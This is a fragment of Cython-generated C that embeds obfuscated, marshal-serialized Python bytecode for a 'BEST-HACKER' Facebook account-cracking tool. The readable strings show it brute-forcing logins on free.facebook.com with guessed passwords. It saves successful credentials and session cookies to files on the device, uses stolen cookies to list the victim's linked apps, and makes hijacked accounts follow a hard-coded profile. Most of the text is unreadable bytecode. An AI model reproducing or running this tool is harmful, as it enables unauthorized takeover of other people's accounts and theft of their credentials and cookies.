\x93\x01d\x10d\x11\x93\x01d\x12d\x13\x93\x01d\x14d\x15\x93\x01d\x16d\x17\x93\x01d\x18d\x19\x93\x01d\x1ad\x1b\x93\x01d\x1cd\x1d\x93\x01d\x1ed\x1f\x93\x01d d!\x93\x01d"d#\x93\x01d$d%\x93\x01d&d\'\x93\x01d(d)\x93\x01d*d+\x93\x01d,d-|\x04d.\x9c\x03\xa5\x01}\x08|\x05j\x0bd/|\x07|\x08d0\x8d\x03j\x06}\t|\x05j\x0c\xa0\r\xa1\x00\xa0\x0e\xa1\x00}\nd1|\nv\x00r\xd8d2\xa0\x0fd3d4\x84\x00|\x05j\x0c\xa0\r\xa1\x00\xa0\x10\xa1\x00D\x00\x83\x01\xa1\x01}\x0b|\x0bd5d6\x85\x02\x19\x00}\x0ct\x11d7|\x0c\x17\x00d8\x17\x00|\x03\x17\x00d9\x17\x00|\x0b\x17\x00d:\x17\x00|\x04\x17\x00d;\x17\x00\x83\x01\x01\x00t\x12|\x05|\x0b\x83\x02\x01\x00t\x13d<d=\x83\x02\xa0\x14|\x0cd8\x17\x00|\x03\x17\x00d>\x17\x00\xa1\x01\x01\x00t\x15\xa0\x16|\x0c\xa1\x01\x01\x00\x01\x00n<d?|\nv\x00\x90\x01r\x13d2\xa0\x0fd@d4\x84\x00|\x05j\x0c\xa0\r\xa1\x00\xa0\x10\xa1\x00D\x00\x83\x01\xa1\x01}\x0b|\x0bdAdB\x85\x02\x19\x00}\x0ct\x11dC|\x0c\x17\x00d8\x17\x00|\x03\x17\x00d;\x17\x00\x83\x01\x01\x00t\x13dDd=\x83\x02\xa0\x14|\x0cd8\x17\x00|\x03\x17\x00dE\x17\x00\xa1\x01\x01\x00t\x17\xa0\x16|\x0c\xa1\x01\x01\x00\x01\x00n\x01q\x04t\x18d\x037\x00a\x18t\x19j\x1a\xa0\x14dFt\x1bt\x18|\x02t\x1ct\x15\x83\x01t\x1ct\x17\x83\x01f\x05\x16\x00\xa1\x01f\x01\x01\x00t\x19j\x1a\xa0\x1d\xa1\x00\x01\x00W\x00d\x00S\x00\x01\x00\x01\x00\x01\x00Y\x00d\x00S\x00)GNrI\x00\x00\x00z\x18name="lsd" value="(.*?)"r6\x00\x00\x00z\x1cname="jazoest" value="(.*?)"z\x19name="m_ts" value="(.*?)"z\x17name="li" value="(.*?)"r \x00\x00\x00z\x06Log In)\tZ\x03lsdZ\x07jazoestZ\x04m_tsZ\x02liZ\ntry_numberZ\x12unrecognized_triesZ\x05emailZ\x04passZ\x05loginZ\tauthorityz\x11free.facebook.comr.\x00\x00\x00Z\x03GETZ\x06schemeZ\x05httpsZ\x06acceptz\x87text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.8z\x0faccept-encodingz\x11gzip, deflate, brz\x0faccept-languagez\x0cen-US,en;q=1z\rcache-controlz#no-cache, no-store, must-revalidateZ\x07refererz\x17https://t.facebook.com/z\tsec-ch-uaz>"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"z\x10sec-ch-ua-mobilez\x02?1z\x12sec-ch-ua-platformZ\x07Windowsz\x0esec-fetch-destZ\x08documentz\x0esec-fetch-modeZ\x08navigatez\x0esec-fetch-sitez\x0bsame-originz\x0esec-fetch-userz\x02?0Z\x06pragmaz\x08no-cacheZ\x08priorityz\x03u=0z\x0ccross-originr\x11\x00\x00\x00)\x03z\x1ccross-origin-resource-policyz\x19upgrade-insecure-requestsz\nuser-agentzBhttps://free.facebook.com/login/device-based/regular/login/?refsrc)\x02\xda\x04dataZ\x07headersZ\x06c_user\xfa\x01;c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00S\x00\x00\x00\xf3\x1c\x00\x00\x00g\x00|\x00]\n\\\x02}\x01}\x02|\x01d\x00\x17\x00|\x02\x17\x00\x91\x02q\x02S\x00\xa9\x01\xfa\x01=r\x05\x00\x00\x00\xa9\x03r3\x00\x00\x00\xda\x03key\xda\x05valuer\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r4\x00\x00\x00\x96\x02\x00\x00\xf3\x02\x00\x00\x00\x1c\x00z\x1arcrack.<locals>.<listcomp>r\x81\x00\x00\x00\xe9\x16\x00\x00\x00u\x19\x00\x00\x00    \x1b[1;32m(B-H-OK\xf0\x9f\x94\xa5)  z\x03 | z\x1b  \n \x1b[1;33mCookie = \x1b[1;32mz\x03 \n z\t  \x1b[0;97mz\x12/sdcard/B-H-OK.txtrF\x00\x00\x00rM\x00\x00\x00Z\ncheckpointc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00S\x00\x00\x00r\x91\x00\x00\x00r\x92\x00\x00\x00r\x05\x00\x00\x00r\x94\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r4\x00\x00\x00\xa6\x02\x00\x00r\x97\x00\x00\x00\xe9\x18\x00\x00\x00\xe9\'\x00\x00\x00u\x19\x00\x00\x00    \x1b[1;30m(B-H-CP\xf0\x9f\xa4\x95)  z\x12/sdcard/B-H-CP.txtz\x02 \nz1\r     %s[BEST-HACKER] [%s/%s]  OK:- %s  CP:- %s \r)\x1er}\x00\x00\x00r~\x00\x00\x00\xda\x04ugen\xda\x08requestsZ\x07Sessionr7\x00\x00\x00r1\x00\x00\x00\xda\x02re\xda\x06searchrJ\x00\x00\x00\xda\x05groupr-\x00\x00\x00r+\x00\x00\x00Z\x08get_dict\xda\x04keysr\x86\x00\x00\x00\xda\x05itemsr\x16\x00\x00\x00rE\x00\x00\x00\xda\x04openrP\x00\x00\x00\xda\x03oksr\x87\x00\x00\x00\xda\x03cps\xda\x04looprN\x00\x00\x00rO\x00\x00\x00rf\x00\x00\x00r9\x00\x00\x00rQ\x00\x00\x00)\rr\x8e\x00\x00\x00r\x8d\x00\x00\x00r\x8c\x00\x00\x00Z\x02psZ\x03pror@\x00\x00\x00Z\x07free_fbZ\x08log_dataZ\rheader_freefbZ\x02loZ\x0blog_cookiesrA\x00\x00\x00Z\x03cidr\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x89\x00\x00\x00>\x02\x00\x00s\x96\x00\x00\x00\x04\x0c\n\x02\n\x02\x08\x02\x0c\x02\x14\x04\x14\x02\x14\x02\x14\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x06\xee\x08\x14\x04\x02\x02\xfe\x04\x04\x02\xfc\x04\x06\x02\xfa\x04\x08\x02\xf8\x04\n\x02\xf6\x04\x0c\x02\xf4\x04\x0e\x02\xf2\x04\x10\x02\xf0\x04\x12\x02\xee\x04\x14\x02\xec\x04\x16\x02\xea\x04\x18\x02\xe8\x04\x1a\x02\xe6\x04\x1c\x02\xe4\x04\x1e\x02\xe2\x04 \x02\xe0\x02"\x02\x02\x02\x02\x08\xda\x12(\x0e\x02\x08\x02\x1e\x02\x0c\x02(\x02\n\x02\x1c\x02\n\x02\x04\x02\n\x02\x1e\x02\x0c\x02\x18\x02\x1c\x02\n\x02\x04\x02\x02\x04\x08\x02$\x02\x10\x02\x06\x02\x06\x02r\x89\x00\x00\x00)kr\x13\x00\x00\x00rN\x00\x00\x00rR\x00\x00\x00r\x9c\x00\x00\x00Z\x04uuidr\x14\x00\x00\x00r\x03\x00\x00\x00r\x15\x00\x00\x00r\x1a\x00\x00\x00r\x18\x00\x00\x00r\x1c\x00\x00\x00Z\x04jsonr}\x00\x00\x00r\x9d\x00\x00\x00rH\x00\x00\x00\xda\x08platform\xda\x06base64Z\x03bs4r#\x00\x00\x00rC\x00\x00\x00Z\x04ressr%\x00\x00\x00r$\x00\x00\x00r&\x00\x00\x00Z\x05waktuZ\x12concurrent.futuresr\'\x00\x00\x00r\x88\x00\x00\x00Z\tmechanizeZ\x13requests.exceptionsr(\x00\x00\x00\xda\x13ModuleNotFoundErrorrE\x00\x00\x00rL\x00\x00\x00Z\x03REDr<\x00\x00\x00r=\x00\x00\x00Z\x06YELLOWZ\x04BLUEZ\x06ORANGErl\x00\x00\x00r;\x00\x00\x00rf\x00\x00\x00ri\x00\x00\x00r`\x00\x00\x00rq\x00\x00\x00rk\x00\x00\x00r:\x00\x00\x00r_\x00\x00\x00Z\x02BNZ\x03BBLZ\x02BPZ\x02BBZ\x02BKZ\x02BHZ\x02BMZ\x02BAZ\x08my_colorr~\x00\x00\x00Z\x05warnaZ\x03now\xda\x08strftimeZ\tdt_stringZ\x07currentZ\x04yearZ\x02taZ\x05monthZ\x02buZ\x03dayZ\x02haZ\x05todayr\xa5\x00\x00\x00r\xa3\x00\x00\x00r\xa4\x00\x00\x00r\x0f\x00\x00\x00rT\x00\x00\x00Z\x02lt\xda\x03cmdr\x85\x00\x00\x00Z\x03ltxrF\x00\x00\x00\xda\x03tagr\x16\x00\x00\x00\xda\x01v\xda\x06updaterJ\x00\x00\x00rX\x00\x00\x00Z\x05ugen2r\x9b\x00\x00\x00r>\x00\x00\x00Z\x02xdZ\x02aa\xda\x01b\xda\x01c\xda\x01dZ\trandrangerS\x00\x00\x00\xda\x01f\xda\x01g\xda\x01hr"\x00\x00\x00\xda\x01j\xda\x01k\xda\x01lZ\x05uaku2r\x87\x00\x00\x00r\x89\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\x08<module>\x01\x00\x00\x00s\xde\x00\x00\x00\x08\x04\x08\x02\x08\x02\x08\x02\x08\x02\n\x02\n\x02\x0e\x02\x04\x08\x08\x02\x08\x16\x08\x16P.\n\x02\x0c\x02\x0c\x02\x08\x02\x0c\x02\x0c\x02\x0c\x02\x0c\x02\x02\x02\x08\x02\x0c\x02\x08\x02\x10\x02\x0c\x02\n\x02\x0e\x02\x02\xfc\x08\x08\x084\x0e\x12\x04\x0e\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x10\x04\x04\xfe\n\x04\x08\x02\n\x02\x08\x02\x06\x02\x06\x02\x06\x02\x08\x02\x04\x02\x04<\x04\x02\x04\x02\x08\x04\x0c\x06\x0c\x02\x0e\x02\n\x02\x08\x02\x06\x02\x04\x04\x04\x02\x02\x06\x08\x02\x04\x02\x04\x02\x04\x02\x0e\x02\x0c\x02\x02\x02\x04\x80\x10\x02\x08\x04\x04\x0e\x04\x02\x0c\x04\x04\x02\x0e\x02\x04\x02\x0e\x02\x0c\x02\x0e\x02\x04\x02\x0c\x02\x04\x02\x0c\x02\x0c\x02\x04\x02B\x02\x0e\x02\x08\x06\x08c\x00\x7f\n\x05'))
 */
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_marshal, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_marshal, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "oo.py":6
 * 
 * import marshal
 * exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00@\x00\x00\x00s\xc8\x03\x00\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x03Z\x03d\x00d\x01l\x04Z\x04e\x00\xa0\x05d\x02\xa1\x01\x01\x00e\x00\xa0\x05d\x03\xa1\x01\x01\x00G\x00d\x04d\x05\x84\x00d\x05\x83\x02Z\x06d\x06Z\x07d\x07d\x08\x84\x00Z\x08d\td\n\x84\x00Z\td\x0bd\x0c\x84\x00Z\nd\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x0bZ\x0bd\x00d\x01l\x0cZ\x0cd\x00d\x01l\rZ\rd\x00d\x01l\x0eZ\x0ed\x00d\x01l\x0fZ\x0fd\x00d\x01l\x10Z\x10d\x00d\x01l\x04Z\x04e\x00\xa0\x05d\x02\xa1\x01\x01\x00d\x00d\rl\x11m\x12Z\x13\x01\x00d\x00d\rl\x11m\x12Z\x12\x01\x00d\x00d\x01l\x03Z\x14d\x00d\x0el\x15m\x16Z\x16\x01\x00d\x00d\x0fl\x15m\x15Z\x15\x01\x00d\x00d\x10l\x02m\x17Z\x17\x01\x00d\x00d\x10l\x02m\x17Z\x18\x01\x00z\x16d\x00d\x01l\x03Z\x03d\x00d\x11l\x19m\x1aZ\x1b\x01\x00d\x00d\x01l\x1cZ\x1cd\x00d\x12l\x1dm\x1eZ\x1e\x01\x00W\x00n\x13\x04\x00e\x1fy\xb1\x01\x00\x01\x00\x01\x00e\x00\xa0\x05d\x13\xa1\x01\x01\x00e\x00\xa0\x05d\x14\xa1\x01\x01\x00Y\x00n\x01w\x00d\x15d\x16\x84\x00Z d\x17d\x18\x84\x00Z!G\x00d\x19d\x05\x84\x00d\x05\x83\x02Z\x06d\x1aZ"d\x1bZ#d\x1cZ$d\x1dZ%d\x1eZ&d\x1fZ\'d\x1bZ(d\x1aZ)d Z*d!Z+d"Z,d#Z-d$Z.d%Z/d&Z0d\'Z1d(Z2d)Z3d*Z4d+Z5d,Z6d-Z7d.Z8e(e)e*e+e,e-e.e/g\x08Z9e\x0c\xa0:e9\xa1\x01Z;e\x15\xa0<\xa1\x00Z<e<\xa0=d/\xa1\x01Z>e\x15\xa0<\xa1\x00Z?e?j@ZAe?jBZCe?jDZEe\x16\xa0F\xa1\x00ZFd0Z\x07d\x00aGg\x00aHg\x00aId1d2\x84\x00ZJd\x00d3l\x02mKZL\x01\x00d\x00d4l\x00m\x05ZM\x01\x00eNeL\x83\x00d5\x19\x00\x83\x01ZOeOd6k\x04\x90\x01rCeOd6\x18\x00ZPd7ZQn\x04eOZPd8ZQz\x1aeRd9\x83\x01\x01\x00d:ZSd;ZTd;ZTeUeS\x83\x01eTv\x00\x90\x01r_e\x00\xa0\x05d2\xa1\x01\x01\x00n\x01\t\x00W\x00n\x08\x01\x00\x01\x00\x01\x00eRd<\x83\x01\x01\x00Y\x00d=d>\x84\x00ZVg\x00ZWg\x00ZXeYd?\x83\x01D\x00]`ZZd@Z[e\x0c\xa0:g\x00dA\xa2\x01\xa1\x01Z\\dBZ]e\x0c\xa0:g\x00dC\xa2\x01\xa1\x01Z^e\x0c\xa0_dDdE\xa1\x02Z`e\x0c\xa0:g\x00dC\xa2\x01\xa1\x01ZadFZbe\x0c\xa0_dGdH\xa1\x02ZcdIZde\x0c\xa0_dJdK\xa1\x02Zee\x0c\xa0_dLdM\xa1\x02ZfdNZge[\x9b\x00dOe\\\x9b\x00dPe]\x9b\x00e^\x9b\x00e`\x9b\x00ea\x9b\x00dQeb\x9b\x00ec\x9b\x00dRed\x9b\x00dRee\x9b\x00dRef\x9b\x00dOeg\x9b\x00\x9d\x13ZheX\xa0ieh\xa1\x01\x01\x00\x90\x01qvdSdT\x84\x00ZddUdV\x84\x00Zje\x08\x83\x00\x01\x00d\x01S\x00)W\xe9\x00\x00\x00\x00Nz\x08git pullz\x10pkg install curlc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00@\x00\x00\x00\xf3\x14\x00\x00\x00e\x00Z\x01d\x00Z\x02d\x01d\x02\x84\x00Z\x03d\x03S\x00)\x04\xda\x05jalanc\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00C\x00\x00\x00s\x04\x00\x00\x00d\x00S\x00\xa9\x01N\xa9\x00)\x02\xda\x04self\xda\x01zr\x05\x00\x00\x00r\x05\x00\x00\x00\xfa\x06<code>\xda\x08__init__\x17\x00\x00\x00s\x02\x00\x00\x00\x04\x02\xfa\x0ejalan.__init__N\xa9\x04\xda\x08__name__\xda\n__module__\xda\x0c__qualname__r\t\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x03\x00\x00\x00\x13\x00\x00\x00s\x04\x00\x00\x00\x08\x00\x0c\x04r\x03\x00\x00\x00a\x03\x04\x00\x00   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mBEST-HACKER\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mBEST\x1b[0;m\x1b[1;32m HACKER \x1b[1;33mEDRIS\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m BEST HACKER\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mBEST-HACKER\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE BY BEST HACKER\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mBEST HACKER\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m1.0\n\x1b[1;37m================= \x1b[32;45mBEST-HACKER\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO BEST HACKER TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mAFG\x1b[0;m ======================\nc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00sR\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00t\x02t\x03\x83\x01\x01\x00t\x04d\x02\x83\x01\x01\x00t\x04d\x03\x83\x01\x01\x00t\x05d\x04\x83\x01}\x00|\x00d\x05k\x02r#t\x00\xa0\x01d\x06\xa1\x01\x01\x00t\x06\x83\x00\x01\x00d\x00S\x00d\x00d\x07\x83\x01\x01\x00d\x00S\x00)\x08N\xda\x05clearz" [1] SUBSCRIBE CHANNEL BEST HACKER\xfa\t [2] EXITz\x16\n   Choose option >>> \xda\x011z/xdg-open https://youtube.com/c/BestHacker004200\xfa\x13\n\x1b[1;31mEXIT\x1b[0;97m)\x07\xda\x02os\xda\x06systemr\x03\x00\x00\x00\xda\x04logo\xda\x05print\xda\x05input\xda\x02FD\xa9\x01Z\x03optr\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\x02ud\x1d\x00\x00\x00\xf3\x14\x00\x00\x00\n\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\n\x02\x06\x02\x04\x02\x0c\x02r\x1a\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00sR\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00t\x02t\x03\x83\x01\x01\x00t\x02d\x02\x83\x01\x01\x00t\x02d\x03\x83\x01\x01\x00t\x04d\x04\x83\x01}\x00|\x00d\x05k\x02r#t\x00\xa0\x01d\x06\xa1\x01\x01\x00t\x05\x83\x00\x01\x00d\x00S\x00d\x00d\x07\x83\x01\x01\x00d\x00S\x00)\x08Nr\x0f\x00\x00\x00z#\x1b[1;33m [1] JOINED TELEGRAM CHANNELr\x10\x00\x00\x00z\x1d\n  \x1b[1;32m Choose option >>> r\x11\x00\x00\x00z&xdg-open https://t.me/Best_Hacker00420r\x12\x00\x00\x00)\x06r\x13\x00\x00\x00r\x14\x00\x00\x00r\x16\x00\x00\x00r\x15\x00\x00\x00r\x17\x00\x00\x00\xda\x01or\x19\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x18\x00\x00\x003\x00\x00\x00r\x1b\x00\x00\x00r\x18\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00s\xa6\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00t\x02t\x03\x83\x01\x01\x00t\x02d\x02\x83\x01\x01\x00t\x04d\x03\x83\x01\x01\x00t\x02d\x04\x83\x01\x01\x00t\x02d\x05\x83\x01\x01\x00t\x02d\x06\x83\x01\x01\x00t\x02d\x07\x83\x01\x01\x00t\x05d\x08\x83\x01}\x00|\x00d\tk\x02r,t\x06\x83\x00\x01\x00d\x00d\nk\x02r7t\x00\xa0\x01d\x0b\xa1\x01\x01\x00d\x00S\x00d\x00d\x0ck\x02rBt\x00\xa0\x01d\r\xa1\x01\x01\x00d\x00S\x00d\x00d\x0ek\x02rMt\x00\xa0\x01d\x0f\xa1\x01\x01\x00d\x00S\x00d\x00d\x10\x83\x01\x01\x00d\x00S\x00)\x11Nr\x0f\x00\x00\x00u$\x00\x00\x00\t\xf0\x9f\x94\xa5\xf0\x9f\x94\xa5RANDOM NUMBER CRACK\xf0\x9f\x94\xa5\xf0\x9f\x94\xa5\xda\x00z \x1b[1;32m [1]\x1b[1;33m RANDOM CRACK z \x1b[1;32m [2] \x1b[1;32mJOIN TELEGRAMz\x1f \x1b[1;32m[3] \x1b[1;32mJOIN FB PAGEz\x18 \x1b[1;32m[00] \x1b[1;31mEXITz\x1e\n   \x1b[1;32m Choose option >>> r\x11\x00\x00\x00\xda\x012z\x1exdg-open t.me/Best_Hacker00420\xda\x013z2xdg-open https://www.facebook.com/Best_hacker00420\xda\x010\xda\x04exitz$\n\x1b[1;31m  Choose valid option\x1b[0;97m)\x07r\x13\x00\x00\x00r\x14\x00\x00\x00r\x03\x00\x00\x00r\x15\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00\xda\x01ir\x19\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x1c\x00\x00\x00I\x00\x00\x00s*\x00\x00\x00\n\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x06\x02\x08\x02\n\x02\x04\x02\x08\x02\n\x02\x04\x04\x08\x02\n\x02\x04\x02\x0c\x02r\x1c\x00\x00\x00)\x01\xda\rBeautifulSoup)\x01\xda\x04date)\x01\xda\x08datetime)\x01\xda\x05sleep)\x01\xda\x12ThreadPoolExecutor)\x01\xda\x0fConnectionErrorz9pip install mechanize requests futures bs4==2 > /dev/nullz\x0fpip install bs4c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\t\x00\x00\x00C\x00\x00\x00sf\x01\x00\x00|\x00j\x00d\x01d\x02|\x01i\x01d\x03\x8d\x02j\x01}\x02t\x02|\x02d\x04\x83\x02}\x03|\x03j\x03d\x05d\x06d\x07\x8d\x02}\x04d\x08d\t\x84\x00|\x04\xa0\x04d\n\xa1\x01D\x00\x83\x01}\x05t\x05|\x05\x83\x01d\x0bk\x02r2t\x06d\x0ct\x07t\x08t\x07t\x08t\x07f\x05\x16\x00\x83\x01\x01\x00n$t\x06d\rt\t\x9b\x00\x9d\x02t\n\x16\x00\x83\x01\x01\x00t\x0bt\x05|\x05\x83\x01\x83\x01D\x00]\x14}\x06t\x06d\x0et\x07|\x06d\x0f\x17\x00|\x05|\x06\x19\x00\xa0\x0cd\x10d\x11\xa1\x02t\x07f\x04\x16\x00\x83\x01\x01\x00qA|\x00j\x00d\x12d\x02|\x01i\x01d\x03\x8d\x02j\x01}\x02t\x02|\x02d\x04\x83\x02}\x03|\x03j\x03d\x05d\x06d\x07\x8d\x02}\x04d\x13d\t\x84\x00|\x04\xa0\x04d\n\xa1\x01D\x00\x83\x01}\x05t\x05|\x05\x83\x01d\x0bk\x02r\x89t\x06d\x14t\x07t\x08t\x07t\x08t\x07f\x05\x16\x00\x83\x01\x01\x00d\x00S\x00t\x06d\x15t\t\x9b\x00\x9d\x02t\x08\x16\x00\x83\x01\x01\x00t\x0bt\x05|\x05\x83\x01\x83\x01D\x00]\x14}\x06t\x06d\x0et\x07|\x06d\x0f\x17\x00|\x05|\x06\x19\x00\xa0\x0cd\x16d\x17\xa1\x02t\x07f\x04\x16\x00\x83\x01\x01\x00q\x98t\x06d\x18\x83\x01\x01\x00d\x00S\x00)\x19Nz:https://free.facebook.com/settings/apps/tabbed/?tab=active\xda\x06cookie\xa9\x01\xda\x07cookies\xfa\x0bhtml.parserZ\x04form\xda\x04post)\x01\xda\x06methodc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00S\x00\x00\x00\xf3\x12\x00\x00\x00g\x00|\x00]\x05}\x01|\x01j\x00\x91\x02q\x02S\x00r\x05\x00\x00\x00\xa9\x01\xda\x04text\xa9\x02\xda\x02.0r"\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\n<listcomp>\xa3\x00\x00\x00\xf3\x02\x00\x00\x00\x12\x00z\x1bcek_apk.<locals>.<listcomp>Z\x02h3r\x01\x00\x00\x00z.\r%s[%s!%s] %sSorry there is no Active  Apk%s  u1\x00\x00\x00\r[\xf0\x9f\x8e\xae] %s \x1b[1;95m \xe2\x98\x86 Your Active Apps \xe2\x98\x86     :z\x0c\r[%s%s] %s%s\xe9\x01\x00\x00\x00z\x10Ditambahkan padaz\x11 Ditambahkan padaz<https://free.facebook.com/settings/apps/tabbed/?tab=inactivec\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00S\x00\x00\x00r/\x00\x00\x00r\x05\x00\x00\x00r0\x00\x00\x00r2\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r4\x00\x00\x00\xbb\x00\x00\x00r5\x00\x00\x00z8\r%s[%s!%s] %sSorry there is no Expired Apk%s           \nu1\x00\x00\x00\r[\xf0\x9f\x8e\xae] %s \x1b[1;95m \xe2\x97\x87 Your Expired Apps \xe2\x97\x87    :Z\x0bKedaluwarsaz\x0c Kedaluwarsar\x1d\x00\x00\x00)\r\xda\x03getr1\x00\x00\x00r#\x00\x00\x00\xda\x04findZ\x08find_all\xda\x03lenr\x16\x00\x00\x00\xda\x01N\xda\x01M\xda\x05WHITE\xda\x05GREEN\xda\x05range\xda\x07replace)\x07\xda\x07session\xda\x04coki\xda\x01w\xda\x03sop\xda\x01xZ\x04gamer"\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\x07cek_apk\x9b\x00\x00\x00s&\x00\x00\x00\x14\x02\n\x02\x0e\x02\x14\x02\x0c\x02\x18\x02\x12\x04\x10\x02&\x02\x14\x06\n\x02\x0e\x02\x14\x02\x0c\x02\x1a\x02\x12\x04\x10\x02&\x02\x0c\x04rE\x00\x00\x00c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\\\x00\x00\x00t\x00|\x01j\x01d\x01d\x02|\x02i\x01f\x02i\x00d\x03\xa4\x01\x8e\x01j\x02d\x04\x83\x02}\x03|\x03j\x03d\ni\x00d\x07\xa4\x01\x8e\x01\xa0\x01d\x08\xa1\x01}\x04|\x01j\x01d\tt\x04|\x04\x83\x01\x17\x00d\x02|\x02i\x01f\x02i\x00d\x03\xa4\x01\x8e\x01j\x02\x01\x00d\x00S\x00)\x0bNz8https://free.facebook.com/profile.php?id=100015315258519r)\x00\x00\x00r*\x00\x00\x00r,\x00\x00\x00\xda\x01a\xda\x05Ikuti)\x01\xda\x06stringZ\x04href\xfa\x19https://free.facebook.com)\x02rF\x00\x00\x00rG\x00\x00\x00)\x05r#\x00\x00\x00r7\x00\x00\x00r1\x00\x00\x00r8\x00\x00\x00\xda\x03str)\x05r\x06\x00\x00\x00r@\x00\x00\x00rA\x00\x00\x00\xda\x01rr7\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\x06follow\xcf\x00\x00\x00s\x1c\x00\x00\x00\x08\x02\x04\x02\x06\xfe\x02\x02\x04\xfe\x04\x02\x04\xfe\x16\x04\x0e\x02\x04\x02\x06\xfe\x02\x02\x04\xfe\x08\x02rL\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00@\x00\x00\x00r\x02\x00\x00\x00)\x04r\x03\x00\x00\x00c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00C\x00\x00\x00s2\x00\x00\x00|\x01d\x01\x17\x00D\x00]\x12}\x02t\x00j\x01\xa0\x02|\x02\xa1\x01\x01\x00t\x00j\x01\xa0\x03\xa1\x00\x01\x00t\x04\xa0\x05d\x02\xa1\x01\x01\x00q\x04d\x00S\x00)\x03N\xda\x01\ng;\xdfO\x8d\x97n\x82?)\x06\xda\x03sys\xda\x06stdout\xda\x05write\xda\x05flush\xda\x04timer&\x00\x00\x00)\x03r\x06\x00\x00\x00